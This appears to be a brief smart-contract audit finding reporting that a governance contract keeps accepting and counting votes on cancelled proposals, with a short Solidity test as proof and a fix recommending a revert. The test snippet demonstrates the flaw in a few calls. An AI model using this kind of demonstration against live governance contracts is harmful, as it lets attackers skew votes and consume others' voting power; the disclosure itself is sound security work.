Direct Governance Manipulation

Cancelled proposals remain votable

Votes are counted and recorded after cancellation

Creates parallel governance state where cancelled proposals still accumulate power

// Proof from test

```
governance.cancel(proposalId);  // Proposal cancelled
governance.castVote(proposalId, true);  // Still works
(uint256 forVotes, uint256 againstVotes) = governance.getVotes(proposalId); // Votes counted
assertTrue(forVotes > 0); // Votes accumulated
Cancelled proposals still affect voting metrics
```

skew governance statistics and historical data

Vote power is still consumed on cancelled proposals

Tools Used
## Recommendations
Add a check to revert if a vote want to be casted on a canceled vote